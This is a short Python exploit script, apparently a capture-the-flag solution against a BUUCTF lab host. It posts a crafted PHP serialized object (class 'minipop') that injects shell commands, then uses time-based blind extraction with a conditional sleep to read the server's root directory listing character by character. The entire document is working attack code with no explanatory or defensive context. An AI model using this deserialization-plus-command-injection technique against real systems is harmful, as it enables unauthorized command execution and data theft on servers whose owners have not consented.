import time
import requests
url = "http://43577037-cc8c-49fd-af5e-798c918d705d.node4.buuoj.cn:81/"
result = ""
for i in range(1,15):
    for j in range(1,20):
        #ascii码表
        num=0
        for k in range(32,127):
            k=chr(k)
            payload =f"if [ `ls / | awk NR=={i} | cut -c {j}` == '{k}' ];then sleep 2;fi"
            length=len(payload)
            payload2 ={
                "payload": 'O:7:"minipop":2:{{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{{s:4:"code";s:{0}:"{1}";s:13:"qwejaskdjnlka";N;}}}}'.format(length,payload)
                }
            t1=time.time()
            r=requests.post(url=url,data=payload2)
            t2=time.time()
            num+=1
            if t2-t1 >1.5:
                result+=k
                print(result)
                break
        if num>=94:
            break
    result+='  '
